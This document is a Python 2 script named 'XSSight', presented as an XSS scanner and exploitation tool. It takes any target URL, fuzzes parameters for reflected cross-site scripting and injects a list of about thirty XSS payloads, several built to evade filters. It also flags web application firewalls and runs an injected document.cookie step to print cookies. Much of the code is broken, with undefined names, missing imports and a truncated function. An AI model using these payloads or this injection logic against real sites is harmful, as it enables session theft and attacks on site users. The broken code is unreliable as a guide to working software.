#!/usr/bin/env python
# -*- coding: cp1252 -*-
# A XSS Scanner and Exploitation Script by D3V teamultimate.in

from __future__ import absolute_import
from __future__ import print_function
import urllib2
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import urllib
from urllib import FancyURLopener
import socket
import time
import ssl
import re
import sys
import cookielib
from functools import partial 

GET, POST = "GET", "POST"

retval, usable = False, False
SMALLER_CHAR_POOL    = ('<', '>')                                                           # characters used for XSS tampering of parameter values (smaller set - for avoiding possible SQLi errors)
LARGER_CHAR_POOL     = ('\'', '"', '>', '<', ';')                                           # characters used for XSS tampering of parameter values (larger set)
GET, POST            = "GET", "POST"                                                        # enumerator-like values used for marking current phase
PREFIX_SUFFIX_LENGTH = 5                                                                    # length of random prefix/suffix used in XSS tampering
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                                     # optional HTTP header names
TIMEOUT = 30                                                                                # connection timeout in seconds
DOM_FILTER_REGEX = r"(?s)<!--.*?-->|\bescape\([^)]+\)|\([^)]+==[^(]+\)|\"[^\"]+\"|'[^']+'"  # filtering regex used before DOM XSS search

REGULAR_PATTERNS = (                                                                        # each (regular pattern) item consists of (r"context regex", (prerequitarget unfiltered characters), "info text", r"content removal regex")
    (r"\A[^<>]*%(chars)s[^<>]*\Z", ('<', '>'), "\".xss.\", pure text response, %(filtering)s filtering", None),
    (r"<!--[^>]*%(chars)s|%(chars)s[^<]*-->", ('<', '>'), "\"<!--.'.xss.'.-->\", inside the comment, %(filtering)s filtering", None),
    (r"(?s)<script[^>]*>[^<]*?'[^<']*%(chars)s|%(chars)s[^<']*'[^<]*</script>", ('\'', ';'), "\"<script>.'.xss.'.</script>\", enclosed by <script> tags, inside single-quotes, %(filtering)s filtering", None),
    (r'(?s)<script[^>]*>[^<]*?"[^<"]*%(chars)s|%(chars)s[^<"]*"[^<]*</script>', ('"', ';'), "'<script>.\".xss.\".</script>', enclosed by <script> tags, inside double-quotes, %(filtering)s filtering", None),
    (r"(?s)<script[^>]*>[^<]*?%(chars)s|%(chars)s[^<]*</script>", (';',), "\"<script>.xss.</script>\", enclosed by <script> tags, %(filtering)s filtering", None),
    (r">[^<]*%(chars)s[^<]*(<|\Z)", ('<', '>'), "\">.xss.<\", outside of tags, %(filtering)s filtering", r"(?s)<script.+?</script>|<!--.*?-->"),
    (r"<[^>]*'[^>']*%(chars)s[^>']*'[^>]*>", ('\'',), "\"<.'.xss.'.>\", inside the tag, inside single-quotes, %(filtering)s filtering", r"(?s)<script.+?</script>|<!--.*?-->"),
    (r'<[^>]*"[^>"]*%(chars)s[^>"]*"[^>]*>', ('"',), "'<.\".xss.\".>', inside the tag, inside double-quotes, %(filtering)s filtering", r"(?s)<script.+?</script>|<!--.*?-->"),
    (r"<[^>]*%(chars)s[^>]*>", (), "\"<.xss.>\", inside the tag, outside of quotes, %(filtering)s filtering", r"(?s)<script.+?</script>|<!--.*?-->"),
)

_headers = {}                                                                               # used for storing dictionary with optional header values

def _retrieve_content(url, data=None):
    try:
        req = urllib2.Request("".join(url[i].replace(' ', "%20") if i > url.find('?') else url[i] for i in range(len(url))), data, _headers)
        retval = urllib2.urlopen(req, timeout=TIMEOUT).read()
    except Exception as ex:
        retval = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", str())
    return retval or ""

def _contains(content, chars):
    content = re.sub(r"\\[%s]" % re.escape("".join(chars)), "", content) if chars else content
    return all(char in content for char in chars)

def scan_page(url, data=None):
    retval, usable = False, False
    url, data = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url, re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    original = re.sub(DOM_FILTER_REGEX, "", _retrieve_content(url, data))
    dom = max(re.search(_, original) for _ in DOM_PATTERNS)

###Cross Site Scripting Payloads###
xss_attack = ["%22%3Cscript%3Ealert%28%27dev%27%29%3C%2Fscript%3E"
                            "<script>alert('dev')</script>",
                            "1<ScRiPt >prompt(962477)</sCripT>",
                            "<script>alert('dev')</script>",
                            "'';!--\"<XSS>=&{()}",
                            "<ScRipt>ALeRt('dev');</sCRipT>",
                            "<body/onhashchange=alert(1)><a href=#>clickit",
                            "<img src=x onerror=prompt(1);>",
                            "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                            "<iframesrc=\"javascript:alert(2)\">",
                            "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                            "<form action=\"Javascript:alert(1)\"><input type=submit>",
                            "<isindex action=data:text/html, type=image>",
                            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                            "<svg/onload=prompt(1);>",
                            "<marquee/onstart=confirm(2)>/",
                            "<body onload=prompt(1);>",
                            "<q/oncut=open()>",
                            "<a onmouseover=location=’javascript:alert(1)>click",
                            "<svg><script>alert&#40/1/&#41</script>",
                            "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                            "<scri%00pt>alert(1);</scri%00pt>",
                            "<scri%00pt>confirm(0);</scri%00pt>",
                            "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                            "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                            "<marquee/onstart=confirm(2)>",
                            "<A HREF=\"http://www.google.com./\">XSS</A>",
                            "<svg/onload=prompt(1);>"]


class MyOpener(FancyURLopener):
    version = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11'
        
myopener = MyOpener()

class JSHTTPCookieProcessor(urllib2.BaseHandler):
    handler_order = 400 






#Function In Case of Crawling 
def xss(exploit):
    for link in links:
        print(Fore.RED + "Testing:",link[0]+exploit)
        try:
            if xi != 0:
                handler = urllib2.Handler({'http': 'http://' + '/'})
                opener = urllib2.build_opener(link[0]+exploit, handler)
                source = opener.open(link[0]+exploit).read()
            else:
                source = myopener.open(link[0]+exploit).read()
                print("Source Length:",len(source))
            if re.search("xss", source.lower()) != None:
                print(Fore.RED + "\n[!] XSS:",link[0]+exploit,"\n")
            else:
                print(Fore.GREEN + "[-] Not Vulnerable.") 
        except(urllib2.HTTPError) as msg:
            print("[-] Error:",msg)
            pass


#Function in case of Vulnerability Confirmation        
def xxs2(exploi):
    print(Fore.RED + " Testing:",host+exploi)
    try:
        if xi != 0:
            handle = urllib2.Handler({'http': 'http://' + '/'})
            opene = urllib2.build_opener(host+exploit, handle)
            sourc = opene.open(host+exploit).read()
        else:
            sourc = myopener.open(host+exploi).read()
            print(" Source Length:",len(sourc))
            ##Detecting WAF if Exist
            if res1.code == 406:
                print(" WAF Detected => (Mod_Security)")
            elif res1.code == 999:
                print(" WAF Detected => WebKnight")
                time.sleep(5)
            elif res1.code == 419:
                print(" WAF Detected => F5 BIG IP")
            else:
                print("\033[1;32m WAF Not Found\033[1;m")
        if re.search("xss", sourc.lower()) != None:
            print(Fore.RED + "\n[!] XSS:",host+exploi,"\n")
                
            
        else:
            print(Fore.GREEN + "[-] Not Vulnerable.")
    except(urllib2.HTTPError) as msg:
        print("[-] Error:",msg)
        pass
        
    
####### Print Menu and Exmaple ########

print("\t\033[1;31m    .-'^`\                                        /`^'-.\033[1;m")
print("\t\033[1;31m  .'   ___\                                      /___   `.\033[1;m")
print("\t\033[1;31m /    /.---.                                    .---.\    `\033[1;m")
print("\t\033[1;31m|    //     '-.  ___________________________ .-'     \\    |\033[1;m")
print("\t\033[1;31m|   ;|         \/--------------------------//         |;   |\033[1;m")
print("\t\033[1;31m\   ||       |\_)          XSSight         (_/|       ||   /\033[1;m")
print("\t\033[1;31m \  | \  . \ ;  |     By Team Ultimate     || ; / .  / |  /\033[1;m")
print("\t\033[1;31m  '\_\ \\ \ \ \ |                          ||/ / / // /_/'\033[1;m")
print("\t\033[1;31m        \\ \ \ \|       Beta Release       |/ / / //\033[1;m")
print("\t\033[1;31m         `'-\_\_\     teamultimate.in     /_/_/-'`\033[1;m")
print("\t\033[1;31m                '--------------------------' \033[1;m")


print("\033[1;35m These types of URLs are accepted\033[1;m")
print(" Example: http://www.website.com/ ")
print(" Example: http://www.website.com= ")
print(" Example: http://www.website.com? ")


host = input("\033[1;35m\n Enter target url:\033[1;m ")
res = myopener.open(host)
res1= urllib.urlopen(host)
html = res.read()
links = re.findall('"((http|href)s?://.*?)"', html)

print((30 * '\033[1;31m-\033[1;m'))
print ("Select an operation:")
print((30 * '\033[1;31m-\033[1;m'))
print (" 1. XSS Scanner")
print (" 2. Payload Injector")
choice = input(' Enter your choice [1-2] : ')
print(res.info())
myfile = res.read()

### Testing the connection ###    
try:
    if sys.argv[3]:
        xi = sys.argv[3]
        print("Testing The Connection...")
        h2 = six.moves.http_client.httplib.ssl(xi)
        h2.connect()
        print("[+] xi:",xi)
except(socket.timeout):
    print("\033[1;31mConnection Timed Out\033[1;m")
    xi = 0
    pass
except:
    xi = 0
    pass


### Print the result in Case of Crawling###
if('1' in choice):
    try:
        for phase in (GET, POST):
            current = host if phase is GET else ("")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&#]*)", current):
                found, usable = False, True
                print("* scanning %s parameter '%s'" % (phase, match.group("parameter")))
                prefix, suffix = ("".join(random.sample(string.ascii_lowercase, PREFIX_SUFFIX_LENGTH)) for i in range(2))
                for pool in (LARGER_CHAR_POOL, SMALLER_CHAR_POOL):
                    if not found:
                        tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote("%s%s%s%s" % ("'" if pool == LARGER_CHAR_POOL else "", prefix, "".join(random.sample(pool, len(pool))), suffix))))
                        content = (_retrieve_content(tampered) if phase is GET else _retrieve_content(url, tampered)).replace("%s%s" % ("'" if pool == LARGER_CHAR_POOL else "", prefix), prefix)
                        for sample in re.finditer("%s([^ ]+?)%s" % (prefix, suffix), content, re.I):
                            for regex, condition, info, content_removal_regex in REGULAR_PATTERNS:
                                context = re.search(regex % {"chars": re.escape(sample.group(0))}, re.sub(content_removal_regex or "", "", content), re.I)
                                if context and not found and sample.group(1).strip():
                                    if _contains(sample.group(1), condition):
                                        print(" (i) %s parameter '%s' appears to be XSS vulnerable (%s)" % (phase, match.group("parameter"), info % dict((("filtering", "no" if all(char in sample.group(1) for char in LARGER_CHAR_POOL) else "some"),))))
                                        found = retval = True
                                    break
        if not usable:
            print("\033[1;31m (x) no usable GET/POST parameters found\033[1;m")


    except urllib2.HTTPError:
        print("Error")

if('2' in choice):
    print ("[+] Injecting payloads in the parameter:", host),len(xss_attack),("payloads\n")
    for exploi in xss_attack:
        time.sleep(5)
        xxs2(exploi.replace("\n",""))


###Confirm by Searching Payload in Web Page###
        heer = xss_attack
        try:
            mam = myopener.open(host+exploi).read()
            found = False
            for payload in heer:
                if payload in mam:
                    found = True
            if found:                
                print ("\033[1;32m[+] Confirmed Payload Found in Web Page Code\033[1;m")
                #Getting COKKIES 
                cj = cookielib.CookieJar()
                opener = build_opener(HTTPCookieProcessor(cj), HTTPHandler())
                xss_cookie = ("%3cscript%3ealert(document.cookie)%3c/script%3e")
                url1 = (host+xss_cookie)
                req = Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                f = opener.open(req)
                html = f.read()
                print ("Excute document.cookie")
                time.sleep (3)
                for cookie in cj:
                    print ("\033[1;32m==>\033[1;m", cookie)
                    sys.exit()
            else:
                print ("\033[1;31m[-] False Positive\033[1;m")
                
        except urllib2.HTTPError:
            print ("\033[1;31mError\033[1;m")
